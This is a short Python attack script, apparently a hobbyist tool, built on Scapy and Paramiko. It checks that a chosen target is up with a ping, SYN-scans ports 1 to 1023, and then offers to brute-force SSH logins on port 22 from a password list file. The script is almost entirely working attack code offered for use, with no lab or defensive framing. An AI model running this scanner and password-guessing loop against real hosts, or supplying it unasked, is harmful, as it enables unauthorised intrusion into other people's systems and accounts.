from scapy.all import *
import paramiko

conf.verb = 0


Target = input("Please enter the target: ")
Registered_Ports = range(1, 1024)
open_ports = []

def scanport(port):
    source_port = RandShort()
    Synchronization_Packet = sr1(IP(dst=Target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)
    if Synchronization_Packet is None:
        return False
    if not Synchronization_Packet.haslayer(TCP):
        return False
    if Synchronization_Packet[TCP].flags == 0x12:
        sr1(IP(dst=Target)/TCP(sport=source_port, dport=port, flags="R"), timeout=2)
        return True


def check_target_availability(Target):
    try:
        conf.verb = 0
        response = sr1(IP(dst=Target) / ICMP(), timeout=3)
        if response is None:
            return False
        if response.haslayer(ICMP):
            if response[ICMP].type == 0:
                return True
        return False

    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def BruteForce(port):
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    user = input("Enter the SSH server's login username: ").strip()
    with open('PasswordList.txt', 'r') as file:
        passwords = file.read().splitlines()
    for password in passwords:
        try:
            print(f"Trying password: {password}")
            SSHconn.connect(Target, port=int(port), username=user, password=password, timeout=1)
            print(f"Successful login with password: {password}")
            SSHconn.close()
            exit(0)
        except Exception:
            print(f"{password} failed")
    SSHconn.close()


if __name__ == "__main__":
    if check_target_availability(Target):
        print(f"The target {Target} is available.")
    else:
        print(f"The target {Target} is not available.")
        exit(0)
for port in Registered_Ports:
    status = scanport(port)
    if status:
        open_ports.append(port)
        print(f"Port {port} is open.")
    else:
        print(f"Port {port} is closed.")

    if 22 in open_ports:
        print("Scan finished.")
        print(f"Port 22 is open. Open ports: {open_ports}")
        answer = input("Do you want to perform a brute-force attack on port 22? (yes/no): ").strip().lower()
        if answer in ['yes', 'y']:
            BruteForce(22)
        else:
            print("Brute-force attack not performed.")
            exit(0)


